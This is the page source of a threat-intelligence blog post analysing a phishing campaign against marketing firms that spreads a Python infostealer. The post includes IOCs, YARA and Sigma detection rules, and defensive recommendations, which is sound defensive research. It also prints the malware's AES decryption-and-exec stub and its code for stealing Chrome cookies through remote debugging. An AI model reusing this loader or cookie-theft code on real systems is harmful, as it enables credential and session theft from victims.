<script>
  import { CodeBlock } from "@skeletonlabs/skeleton";
  import { getModalStore } from "@skeletonlabs/skeleton";
  import phishing_email from "./phishing_email.png";
  import skype_phishing from "./skype_phishing.png";
  import binvis from "./binvis.png";
  import TagList from "$lib/tagList.svelte";
  import AttackTable from "$lib/AttackTable.svelte";
  import { attackData } from "./attackData.js";

  let modalStore = getModalStore();

  function navigate(url) {
    window.location.href = url;
  }

  function triggerImageModal(image) {
    console.log("image", image);
    const modal = {
      image: image,
      modalClasses:
        "max-w-[90%] max-h-[90%] rounded-container-token overflow-hidden shadow-xl",
    };
    modalStore.trigger(modal);
  }
  let tags = [
    "threat intelligence",
    "malware analysis",
    "information stealer",
    "ecrime",
    "distribution",
    "initial access",
  ];
</script>

<div
  class="container h-full mx-auto flex justify-center items-center leading-relaxed"
>
  <div class="space-y-5 m-10 custom-container">
    <h1 class="h1 text-center mb-12" on:click={() => navigate("/")}>@oj-sec</h1>
    <h2 class="h2">
      Hot Leads: Large Scale Phishing Against Marketing Sector Deploys Novel
      Python Infostealer
    </h2>
    <p>3 December 2024 - 13 min read</p>
    <TagList {tags} />
    <h3 class="h3">Key Points</h3>
    <ul class="list-disc ml-4">
      <li>
        From at least mid-October 2024, a threat actor conducted a broad
        phishing campaign to distribute a novel Python-based Windows information
        stealer. The threat actor compromised organisations in at least 30
        countries, predominately India, and almost exclusively in the marketing
        sector. The campaign is likely to originate from a financially motivated
        malware developer whose native language is Vietnamese.
      </li>
      <li>
        The threat actor also monetised intrusions through the theft of
        accounts, with dedicated functionality to validate Meta and TikTok
        advertising accounts before exfiltration. The threat actor likely also
        acts as an initial access broker, with at least one incident culminating
        in the execution of ransomware in the compromised organisation.
      </li>
      <li>
        The threat actor's malware contained a method for bypassing Chrome's
        Application Bound Security cookie storage by restarting Chrome with
        remote debugging enabled and sending debug commands. This method is a
        versatile cookie access technique that has surged in prominence in
        information stealers since Chrome's changes.
      </li>
    </ul>
    <h3 class="h3">Initial Contact and Delivery</h3>
    <p>
      The threat actor initially contacted victim organisations using inquiry
      forms and generic inquiry email addresses. The threat actor posed as a
      prospective marketing client, inquiring about operating a marketing
      campaign in the target organisation's locale worth tens to hundreds of
      thousands of dollars. The threat actor posed as actual employees of the
      impersonated organisations, copying details from employee LinkedIn
      profiles and creating email signatures using legitimate details. We have
      observed the threat actor distributing lure content in at least English,
      French, Hebrew and Arabic.
    </p>
    <p>
      In some instances, the threat actor engaged with an employee at a victim
      organisation to build a pretext before distributing malware. In a subset
      of these protracted engagements, the threat actor shifted communications
      to Skype and Google Chat conversations to build rapport with victims,
      including by scheduling kickoff meetings. In other instances, the threat
      actor distributed malware in the initial message to the victim. The threat
      actor distributed malware using password protected ZIP archives, sent
      directly via chat platforms or via a link to a file hosted on DropBox.
    </p>
    <p>
      We have high confidence that that the threat actor impersonated
      organisations including:
    </p>
    <ul class="ml-8">
      <li>- Nulo Pet Food</li>
      <li>- The Abu Dabi National Oil Company</li>
      <li>- PankcakeSwap</li>
      <li>- Citibank</li>
    </ul>

    <div class="grid grid-cols-2">
      <div>
        <div class="mx-auto flex justify-center items-center">
          <i>Example phishing email received by a victim.</i>
        </div>
        <div class="w-4/5 flex justify-center items-center mx-auto">
          <div
            class="flex justify-center mt-0"
            on:click={() => triggerImageModal(phishing_email)}
          >
            <img
              class="max-w-full h-auto"
              src={phishing_email}
              alt="phishing_email"
            />
          </div>
        </div>
      </div>
      <div>
        <div class="mx-auto flex justify-center items-center">
          <i>Example Skype messages received by a victim.</i>
        </div>
        <div class="w-4/5 flex justify-center items-center mx-auto">
          <div
            class="flex justify-center mt-0"
            on:click={() => triggerImageModal(skype_phishing)}
          >
            <img
              class="max-w-full h-auto"
              src={skype_phishing}
              alt="phishing_email"
            />
          </div>
        </div>
      </div>
    </div>

    <p>
      We have moderate confidence that this campaign overlaps with activity
      using the same techniques to impersonate Bose and MVMT, widely reported in
      marketing communities (see, e.g. <a
        href="https://www.reddit.com/r/marketing/comments/1goz2vo/is_there_a_bose_scam_going_around/"
        style="text-decoration: underline; color: lightblue;"
        >this reddit thread,</a
      >
      and
      <a
        href="https://www.linkedin.com/posts/sallychuku_scam-alert-i-have-had-3-scam-supplier-activity-7255227758723612672-aTeo/"
        style="text-decoration: underline; color: lightblue;"
        >this LinkedIn post</a
      >
      or
      <a
        href="https://finn-mccool.co.uk/marketers-beware-bose-global-com-proposal-scam/"
        style="text-decoration: underline; color: lightblue;"
        >this industry blog post</a
      >). We did not observe Bose or MVMT impersonation in victim artifacts
      obtained during this analysis. This analysis is focused on the malware
      variant used alongside the Nulo pet food lure, which consisted of the
      following files:
    </p>
    <CodeBlock
      language="plaintext"
      code={`
Nulo-PPC-Tracking-Report-2025.zip		0a17ff5428e5fe87be26e8323e87f53489a155f0c526e274ce2aabc88904939b
├── Nulo - Branding Budget 2025.scr 	d7926627286a12632a3dc0633c860a522fbff6fff9ee3bd2197477a2a4a43d50
└── Nulo - Mission Statement.pptx		2350f3ad213c5b9e315ea5017b7cb70575d91a37b2f2e5ab1ad2453bcc478d14
`}
    ></CodeBlock>
    <p>
      Sandbox executions of the analysed payload are avaiailable on <a
        href="https://tria.ge/241126-mpawksxmbs/behavioral1"
        style="text-decoration: underline; color: lightblue;">Tria.ge</a
      >
      and
      <a
        href="https://www.joesandbox.com/analysis/1562172"
        style="text-decoration: underline; color: lightblue;">Joesandbox</a
      >.
    </p>
    <h3 class="h3">First Stage Malware</h3>
    <div class="float-right w-1/5 ml-4 mb-4 rounded-lg">
      <div class="mx-auto flex justify-center items-center text-center mb-1">
        <i>Binvis.io visualisation of binary magnitude.</i>
      </div>
      <div class="w-3/5 flex justify-center items-center mx-auto">
        <div
          class="flex justify-center mt-0"
          on:click={() => triggerImageModal(binvis)}
        >
          <img class="max-w-full h-auto" src={binvis} alt="binvis" />
        </div>
      </div>
    </div>

    <p class="mb-4">
      ZIP archives distributed by the threat actor included one or more decoy
      PDF or Office documents and a Windows screensaver file (<span
        class="pre p-1 break-all">.scr</span
      >) masquerading as a PDF file using a PDF icon. Windows screenshot files
      are functionally Portable Executables and are a common method of achieving
      inadvertent user execution of a malicious payload. The malicious
      screensaver file is a C++ .NET binary that has been intermittently padded
      with null bytes to a size of 928MB, visible as the large sequences of null
      bytes present when visualising of the binary magnitude. The binary padding
      method is nonstandard and is not automatically addressed using tools like
      <a
        href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/pecheck.py"
        style="text-decoration: underline; color: lightblue;">pecheck</a
      >
      or
      <a
        href="https://github.com/Squiblydoo/debloat"
        style="text-decoration: underline; color: lightblue;">debloat</a
      >. Threat actors pad binaries to large sizes to prevent uploads to malware
      sandboxes including VirusTotal and to disrupt the functionality of static
      scanners and emulators.
    </p>
    <p class="mb-4 break-words">
      During dynamic analysis, we observed the malware execute without a Windows
      SmartScreen warning. The screensaver file avoids Mark of the Web due to
      distribution inside an archive, however the file is unsigned and unlikely
      to otherwise have a high reputation. Based on the absence of a SmartScreen
      warning despite these attributes, we assess that the first stage
      executable is moderately likely to contain a SmartScreen bypass. The
      malware contains compilation artifacts that appear to reference a smart
      screen bypass including
      <span class="pre p-1 break-all"
        >C:\Users\administrator\Documents\2_BOT_SCR_BYPASS_WD_HI\</span
      >. We note that the malware is not detected by up-to-date Windows Defender
      statically, during initial execution or post installation.
    </p>
    <p>
      The first stage executable decrypts and drops files including a python
      interpreter to the
      <span class="pre p-1 break-all"
        >C:\Users\&lt;username&gt;\AppData\Local\MSApplicationgVXtz</span
      >
      directory. The malware invokes the python interpreter with a first stage python
      script with the following command line:
    </p>

    <CodeBlock
      language="plaintext"
      code={`
"C:\Users\<username>\AppData\Local\MSApplicationgVXtz\pythonw.exe" "C:\<username>\Admin\AppData\Local\MSApplicationgVXtz\DLLs\rz_317.pd" clickapp 2fukrun copycoin getdocument getwallet openpdf:Nulo_Marketing_Budget:kjhsd87sdafkjh2387sdjfh_jsld2d
            `}
    ></CodeBlock>
    <p>
      The first stage python script is a stub that decrypts a second stage
      python script using a hard-coded decryption key. The second stage script
      is decrypted from a file masquerading as a database file named <span
        class="pre p-1 break-all">Error_cache.db</span
      >. The stub serves to prevent the infostealer payload from ever existing
      on disk in its decrypted form and is also used as the entrypoint after
      persistence is achieved. The stub's true decryption key is redeclared 1168
      space characters after a decoy decryption key is declared on the same
      line. This technique is almost certainly intended to misdirect manual
      analysis. The stub passes command line arguments to the infostealer
      payload.
    </p>
    <div class="mx-auto flex justify-center items-center mb-2">
      <i>Decryption python stub.</i>
    </div>
    <CodeBlock
      language="python"
      lineNumbers={true}
      code={`
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from base64 import b64decode
import os
count = 0;
key = b'aPIYKiq93v3ES7qf';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                key = b'OefWLlUijuGGd5YQ'
def decrypt(ciphertext, key):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(b64decode(ciphertext.encode('utf-8'))) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data.decode('utf-8')
with open(os.path.join(os.path.dirname(__file__), 'Error_cache.db'), 'r', encoding='utf-8') as file:
    content = file.read()
    
exec(decrypt(content,key))
        `}
    ></CodeBlock>
    <h3 class="h3">Python information Stealer</h3>
    <p>
      The inner payload is a novel python-based information stealer. The stealer
      has standard functionality including capturing a screenshot of the
      infected device, exfiltrating files, exfiltrating data from cryptocurrency
      applications and obtaining sensitive information from web browsers. The
      stealer uses up to three hardcoded Telegram bots for exfiltration and
      optionally includes a remote address to execute arbitrary commands from.
      This value was not populated in the sample used for this analysis. Data to
      be exfiltrated is packaged into a ZIP archive before being sent to
      Telegram.
    </p>
    <p>
      When first executed, the stealer opens a decoy PDF file from the path
      specified in the openpdf argument. The malware copies the PDF file to the <span
        class="pre p-1 break-all"
        >C:\Users\&lt;username&gt;\AppData\Local\Temp\</span
      >
      directory and launches it using the system default application. The decoy PDF
      serves to misdirect the victim and conceal the background execution of the
      malware. Next, the malware obtains GeoIP information for the infected system
      using the <span class="pre p-1 break-all">ipinfo.io</span>
      service. If the infected device's IP address is allocated within Vietnam, the
      malware notifies the threat actor via Telegram with the message
      <span class="pre p-1 break-all"
        >[CẢNH BÁO] Tool bị chặn tại Việt Nam!</span
      >
      (translating to
      <span class="pre p-1 break-all"
        >[WARNING] Tool is blocked in Vietnam!</span
      >) and the malware exits. The malware contains other Vietnamese language
      artifacts in code comments and the messages sent to the threat actor's
      Telegram bots.
    </p>
    <p>
      The malware achieves persistence by creating a registry Run key under the
      name <span class="pre p-1 break-all">Microsoft Service</span>
      and by creating a scheduled task called
      <span class="pre p-1 break-all">Audio Driver Update</span> using a COM
      object. Both persistence mechanisms point to the dropped python
      interpreter and the decryption python stub and contain only the
      <span class="pre p-1 break-all">copycoin</span> argument. The
      <span class="pre p-1 break-all">copycoin</span>
      argument is a clipjacker that checks the victim clipboard for cryptocurrency
      addresses using regular expressions and rewrites any identified addresses to
      hard-coded addresses owned by the threat actor. Examination of the threat actor's
      cryptocurrency wallets indicates no successful clipjack transactions, which
      is not surprising given the malware was targeted at corporate marketing devices.
    </p>
    <p>
      The malware exfiltrates information from Edge, Chrome, Brave, Opera,
      Firefox and CocCoc (a Chromium-derivative advertised as "The web browser
      for Vietnamese people") by extracting databases and decrypting sensitive
      information using the <a
        href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata"
        style="text-decoration: underline; color: lightblue;"
        >CryptUnprotectData</a
      >
      API. The malware also contains dedicated functionality to overcome the new
      <a
        href="https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html"
        style="text-decoration: underline; color: lightblue;"
        >Chrome security feature to use Windows Application Bound Security</a
      >
      to secure cookies against infostealers. The malware executes a headless, explicitly
      off screen Chrome session with the
      <span class="pre p-1 break-all">--remote-debugging-port</span>
      argument. This argument is part of Chrome's extensive testing functionality
      and allows the sending of
      <a
        href="https://chromedevtools.github.io/devtools-protocol/"
        style="text-decoration: underline; color: lightblue;"
        >Chrome DevTools commands</a
      >
      to the browser to achieve nonstandard functionality. The malware sends the
      <a
        href="https://chromedevtools.github.io/devtools-protocol/tot/Network/#method-getAllCookies"
        style="text-decoration: underline; color: lightblue;"
        >Network.getAllCookies</a
      > command, which returns all cookies from the browser as a JSON array. Because
      this action instructs the Chrome process to obtain the protected cookie data
      itself, Application Bound Security is bypassed.
    </p>
    <p>
      Remote debugging is one of <a
        href="https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824"
        style="text-decoration: underline; color: lightblue;">several methods</a
      > threat actors have identified for overcoming Application Bound Security since
      Chrome's update. Cookie access through remote debugging is likely to be particularly
      desirable to threat actors because it can be achieved with no disk footprint
      and because it is operating system agnostic. Chrome on MacOS and Linux contain
      the same debug functionality and the extensive volume of Chromium derivatives
      make the technique nearly universal. The Chrome DevTools Protocol can be used
      for other browser attacks, including sensitive information access by sniffing
      application layer traffic before TLS is applied and directly controlling a
      browser session.
    </p>
    <div class="mx-auto flex justify-center items-center mb-2">
      <i
        >Stealer source code excerpts showing cookie access via remote
        debugging.</i
      >
    </div>
    <CodeBlock
      language="python"
      code={`
def start_chrome_with_websocket(chromium_path, userdata_path, profilename):
    port = PatchChromiumv20.default_port
    while PatchChromiumv20.is_port_in_use(port):
        port += 1

    process = subprocess.Popen([
        chromium_path,
        "--headless",
        "--window-position=-5000,-5000",
        f"--remote-debugging-port={port}", 
        "--remote-allow-origins=*",
        f"--user-data-dir={userdata_path}",
        f"--profile-directory={profilename}",
        "--mute-audio",
        "--disable-gpu",
        "--no-sandbox",
        "--disable-extensions",
    ],creationflags=0x08000000)
    time.sleep(2)
    return process,port

def control_chrome(websocket_url):
    print(websocket_url)
    ws = create_connection(websocket_url)
    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
    cookies_response = ws.recv()
    ws.close();
    return json.loads(cookies_response)
            `}
    />
    <p>
      The stealer contains dedicated functionality to gather additional
      information about TikTok marketing cookies identified on an infected
      device. These functions use the victims own device to make requests to
      Facebook and TikTok advertising APIs to identify account balances, payment
      mechanisms and local currencies. This information is built into the
      message text sent to the threat actor's Telegram bots, rather than just
      being written into the exfiltrated archive. This type of functionality is
      not typical in information stealers, as threat actors typically minimise
      their execution footprint and can trivially conduct these checks after
      exfiltration. That is not to say that this technique is unique, as it
      appears in other contemporary stealers including Auilirophile. The
      implementation of these checks and their prominence in the alerts sent to
      the threat actor suggests that these advertising accounts are core to the
      threat actor's monetisation strategy. This is also supported by the threat
      actor's targeting of marketing organisations, which are more likely to
      operate advertising accounts with substantial budgets. The threat actor
      also monetised intrusions through initial access broker activity, with at
      least one infection resulting in the deployment of ransomware at the
      compromised organisation.
    </p>
    <p>
      In a November 2024 analysis, Cisco Talos identified a similar function for
      checking TikTok advertising accounts on an infected device in the <a
        href="https://blog.talosintelligence.com/new-pxa-stealer/"
        style="text-decoration: underline; color: lightblue;"
        >newly identified PXA stealer</a
      >. Notably, PXA stealer is also a python script spawned by a binary
      dropper, contained similar variable names and also contained signs of
      originating from Vietnam. While PXA's loader and stealer source code are
      distinct from this campaign, these similarities are significant and may
      indicate a common code provenance or some overlap or link between the
      respective developers. Based on malware strings bot identifiers in
      exfiltrated data, the threat actor appears to name this malare NKT,
      prepending a version number and appending a build number. The bot
      identifier in the variant used in this analysis is
      <span class="pre p-1 break-all">V20_NKT_1111</span>. The PDB string for
      the screensaver binary is
      <span class="pre p-1 break-all"
        >framework-NKT-Notoken\HienPDF-AOT-2FukRUN\bin\Release\net8.0\win-x64\native\Nulo1111.pdb</span
      >.
    </p>
    <h3 class="h3">Campaign Analysis</h3>
    <p>
      This campaign has impacted at least 125 unique victims since 11 October
      2024. Impacted victims are overwhelmingly located in India, followed by
      the USA and Spain. The threat actor created substantial custom content for
      each lure, including branded documents containing fabricated marketing
      plans and statistics. The threat actor has a high rate of operations and
      is either significantly industrious or has access to human resources based
      on its ability improvise phishing scenarios in real time. While the threat
      actor's malware is unsophisticated, it is effective at avoiding appearing
      in sandboxes, evading defenses and achieving the threat actor's actions on
      objectives
    </p>
    <div class="mx-auto flex justify-center items-center mb-0">
      <i>Distribution of victims by country.</i>
    </div>
    <div class="h-[820px] w-full overflow-hidden border-white border-2">
      <div class="w-full h-full overflow-hidden">
        <iframe
          src="/20241201_map.html"
          class="w-full h-full border-none ml-6"
          title="Distribution of victims by country"
        ></iframe>
      </div>
    </div>

    <h3 class="h3">Recommendations</h3>
    <ul class="list-disc ml-4">
      <li>
        Use application whitelisting to prevent the execution of unknown
        binaries.
      </li>
      <li>
        Configure Group Policies to block the execution of <span
          class="pre p-1 break-all">.scr</span
        > files in Windows environments.
      </li>
      <li>
        Monitor for the execution of Chromium with high risk arguments,
        particularly <span class="pre p-1 break-all"
          >--remote-debugging-port</span
        >.
      </li>
      <li>
        Block all network connections to <span class="pre p-1 break-all"
          >api.telegram.com</span
        > unless Telegram is business critical.
      </li>
      <li>
        Monitor for endpoints connecting to GeoIP services including
        <span class="pre p-1 break-all">ipinfo.io</span>.
      </li>
      <li>
        Monitor for PDF and Office files opening from uncommon directories such
        as <span class="pre p-1 break-all">%APPDATA%</span>.
      </li>
      <li>
        Periodically review scheduled tasks and registry Run keys for suspicious
        persistent software.
      </li>
    </ul>
    <h3 class="h3">MITRE ATT&CK</h3>
    <div class="mx-auto flex justify-center items-center">
      <div class="mx-4 max-w-full">
        <AttackTable {attackData} />
      </div>
    </div>
    <h3 class="h3">Indicators of Compromise</h3>
    <h4 class="h4">Atomic</h4>
    <CodeBlock
      language="plaintext"
      code={`
# sha256
0a17ff5428e5fe87be26e8323e87f53489a155f0c526e274ce2aabc88904939b Nulo-PPC-Tracking-Report-2025.zip
d7926627286a12632a3dc0633c860a522fbff6fff9ee3bd2197477a2a4a43d50 Nulo - Branding Budget 2025.scr
2350f3ad213c5b9e315ea5017b7cb70575d91a37b2f2e5ab1ad2453bcc478d14 Nulo - Mission Statement.pptx
7930dce3295e21cc6674bcda80d9abe11fec39233ab591a49f1e696d93d591a5 rz_317.pd
c286b56f1bf8ab5d1fc17bf4b965d0260b1d1b861d3d58d0af9c5142385f5b4f Error_cache.db

# fqdn
nulo-eu[.]com
pet-nulo[.]com
uae-abudhabioil[.]com
            `}
    />
    <h4 class="h4">Heuristic</h4>
    <i class="text-slate-400">Not tested in production environments.</i>
    <CodeBlock
      language="plaintext"
      code={`
rule nkt_stealer_packed
{
    meta:
        description = "Detects the packed binary for NKT infostealer"
        author = "Oliver Smith"
        email = "oliver@oj-sec.com"
        date = "2024-12-01"

    strings:
        $mz = { 4D 5A } 
        $s1 = "C:\\Users\\administrator\\Documents\\2_BOT_SCR_BYBASS_WD_HI\\"
        $s2 = "framework-NKT-Notoken\\HienPDF-AOT-2FukRUN\\bin\\Release\\"

    condition:
        filesize > 600MB and $mz at 0 and all of ($s1, $s2)
}

rule nkt_python_decryptor
{
    meta:
        description = "Detects the decryptor python stub for NKT stealer"
        author = "Oliver Smith"
        email = "oliver@oj-sec.com"
        date = "2024-12-01"

    strings:
        $s1 = ";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                key = b"
        $s2 = "exec(decrypt(content,key))"
        $s3 = "unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()"

    condition:
        filesize < 3KB and all of them
}
`}
    /><CodeBlock
      language="plaintext"
      code={`
title: Detect NKT Stealer Persistence via Registry Run Key 
status: experimental
description: Detects NKT persistence in Run key.
author: oliver@oj-sec.com
date: 2024-12-01
logsource:
    category: registry
    product: windows
detection:
    selection:
        EventID: 12
        RegistryKey: 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Microsoft Service'
        RegistryValueData|contains: '\\\\AppData\\\\Local\\\\MSApplication'
        RegistryValueData|contains: '\\\\pythonw.exe'
        RegistryValueData|contains: '\\\\DLLs\\\\'
        RegistryValueData|contains: '.pd'
    condition: selection
    level: high
fields:
    - RegistryKey
    - RegistryValueName
    - RegistryValueData
falsepositives:
    - Legitimate software may add entries to this registry key.
tags:
    - attack.persistence
    - attack.t1547.001
`}
    />
    <CodeBlock
      language="plaintext"
      code={`
title: Detect NKT Stealer Persistence via Scheduled Task
status: experimental
description: Detects NKT persistence via Scheduled Task.
author: oliver@oj-sec.com
date: 2024-12-01
logsource:
    category: windows
    product: windows
    service: security
detection:
    selection:
        EventID: 4698  
        TaskName: "AudioDriverUpdateTask2"
        ActionPath|contains: '\\\\AppData\\\\Local\\\\MSApplication'
        ActionPath|contains: '\\\\pythonw.exe'
        ActionPath|contains: '\\\\DLLs\\\\'
        ActionPath|contains: '.pd'
        TaskDescription|contains: 'Check for updates to the audio driver'
    condition: selection
    level: high
fields:
    - TaskName
    - ActionPath
    - ActionArguments
    - TaskDescription 
falsepositives:
    - Legitimate software that schedules tasks for updates may trigger this event.
tags:
    - attack.persistence
    - attack.t1053.005    
`}
    />
  </div>
</div>

<style>
  @media (max-width: 639px) {
    .custom-container {
      max-width: calc(100% - 2rem);
      padding-left: 1rem;
      padding-right: 1rem;
    }
  }
  @media (min-width: 640px) and (max-width: 767px) {
    .custom-container {
      max-width: calc(100% - 4rem);
      padding-left: 2rem;
      padding-right: 2rem;
    }
  }
  @media (min-width: 768px) and (max-width: 1023px) {
    .custom-container {
      max-width: calc(100% - 6rem);
      padding-left: 3rem;
      padding-right: 3rem;
    }
  }
  @media (min-width: 1024px) {
    .custom-container {
      max-width: calc(100% - 8rem);
      padding-left: 4rem;
      padding-right: 4rem;
    }
  }
</style>
